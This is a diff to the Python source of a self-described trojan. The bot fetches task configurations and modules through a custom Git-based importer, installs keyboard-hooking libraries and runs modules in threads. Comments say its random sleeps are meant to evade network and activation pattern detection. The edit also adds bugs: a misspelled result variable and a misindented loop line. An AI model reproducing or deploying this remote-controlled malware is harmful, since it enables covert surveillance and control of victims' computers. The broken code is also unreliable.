@@ -17,7 +17,7 @@ trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules= []#empty list for modules
 configured = False#flag for configuration
-task_queue = Queue.Queue()#task queue is represented by a que
+task_queue = []#task queue is represented by a que
 
 #functions:
 def get_wheel(wheel):
@@ -105,28 +105,34 @@ class GitImporter(object):#custom importer!
 
 def module_runner(module):
     #used for running a module,activates the run function inside the module
-    task_queue.put(1)
-    result = sys.modules[module].run()
+    if not module in task_queue:
+        task_queue.append(module)
+        resault = sys.modules[module].run()
+        task_queue.remove(module)
+        store_module_result(result,module)
     #put the resault of the module inside resault activate the run fucntion
-    #(every module is surrounded by a run function that takes any given number of arguments)
-    task_queue.get()#get the task que
+    #every module is surrounded by a run function that takes any given number of arguments
+    #get the task que top task
     #store the resualt in our repo
-    store_module_result(result,module)#store the module resualt
+    #store the module resualt
     return#end function
-    # main trojan loop
+
+def run_module(module):
+    #sys.modules give all modules that were imported so far, can run it from there
+    return sys.modules[module].run()
 get_wheel("pyHook")
 get_wheel("PyWin32")
 install_wheel("pyHook")#cant make modules import out of github
 install_wheel("PyWin32")#so installing them manualy with pip
 sys.meta_path = [GitImporter()]#add my custom importer into path
+# main trojan loop
 while True:#always be active
-    if task_queue.empty():#if there are no tasks in task que
-        config = get_trojan_config()#get trojan tasks
-        for task in config:#go through each task after u dissasebled the json task file
-            t = threading.Thread(target=module_runner,args=(task['module'],))
-            #start a new thread of the task so u can run a bunch of tasks at the same time
-            t.start()#start the thread
-            time.sleep(random.randint(1,6))
-            #sleep for a random amount of time so there wont be network patterns to recognize
-    #again sleep for a random amount of time so there wont be an activation pattern
+    config = get_trojan_config()#get trojan tasks
+    for task in config:#go through each task after u dissasebled the json task file
+        t = threading.Thread(target=module_runner,args=(task['module'],))
+        #start a new thread of the task so u can run a bunch of tasks at the same time
+        t.start()#start the thread
+        time.sleep(random.randint(1,6))
+        #sleep for a random amount of time so there wont be network patterns to recognize
+#again sleep for a random amount of time so there wont be an activation pattern
     time.sleep(random.randint(1,6))
